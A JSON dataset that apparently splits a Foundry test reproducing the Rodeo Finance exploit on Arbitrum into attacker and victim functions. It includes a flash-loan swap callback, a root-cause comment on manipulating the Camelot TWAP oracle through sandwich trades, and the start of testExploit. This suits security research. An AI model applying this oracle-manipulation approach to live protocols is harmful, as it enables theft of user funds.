[
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        // Swap flashloaned WETH amount to USDC\n        swapTokens(amounts[0], address(WETH), address(USDC));\n        // Swap all of the USDC tokens to WETH\n        swapUSDCToWETH();\n        // Repay flashloan\n        WETH.transfer(address(Vault), amounts[0]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 110_043_452);\n        cheats.label(address(unshETH), \"unsETH\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(Investor), \"Investor\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(SwapRouter), \"SwapRouter\");\n        cheats.label(address(Vault), \"Vault\");\n    }\n\n    // Root Cause\n    // The attacker was able to manipulate the Camelot V2 TWAP Oracle (attacking the unreleased ETH-unshETH pool)\n    // TWAP price was calculated by averaging the last 4 instances of updated price where each price updating occurs every 45 minutes\n    // TWAP price was manipulated via multiblock \u201csandwich\u201d attack\n    // Rodeo Farms utilized the faulty price oracle for LP pricing\n    // Ultimately, the attacker bypassed the Health Factor check via Price Oracle manipulation,\n    // opened positions using borrowed funds from the USDC Pool and triggered large-scale swaps in the Camelot Pair.\n    // They then capitalized on the price difference by conducting equal-sized swaps in the opposite direction, thus profiting from the arbitrage opportunity\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RodeoTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Begin with the specific amount of unsETH (info about amount taken from the above attack tx)\n        // the attackers manipulated the price of TWAP Oracle through multiple transactions\n        // such as https://arbiscan.io/tx/0x5f16637460021994d40430dadc020fffdb96937cfaf2b8cb6cbc03c91980ac7c\n        // https://arbiscan.io/tx/0x9a462209e573962f2654cac9bfe1277abe443cf5d1322ffd645925281fe65a2e\n        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);\n        unshETH.approve(address(Router), type(uint256).max);\n        WETH.approve(address(Router), type(uint256).max);\n        USDC.approve(address(SwapRouter), type(uint256).max);\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICamelotRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISwapRouter",
    "source_type": "victim_contract",
    "function_name": "exactInput",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IInvestor",
    "source_type": "victim_contract",
    "function_name": "earn",
    "original_code": "",
    "description": ""
  }
]